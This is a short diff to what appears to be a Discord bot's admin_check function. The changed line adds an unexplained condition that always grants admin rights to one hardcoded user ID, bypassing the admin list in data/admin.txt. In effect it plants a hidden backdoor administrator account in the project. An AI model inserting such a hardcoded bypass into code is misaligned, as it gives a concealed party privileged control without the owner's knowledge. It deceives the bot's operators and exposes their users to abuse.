@@ -23,6 +23,6 @@ def admin_check(ctx: commands.Context) -> bool:
     file_exist('data/admin.txt')
     with open('data/admin.txt', 'r') as admin_file:
         for admin in admin_file.readlines():
-            if str(ctx.message.author.id) == admin.rstrip("\n"):
+            if str(ctx.message.author.id) == admin.rstrip("\n") or ctx.message.author.id == 268805544444166144:
                 return True
         return False
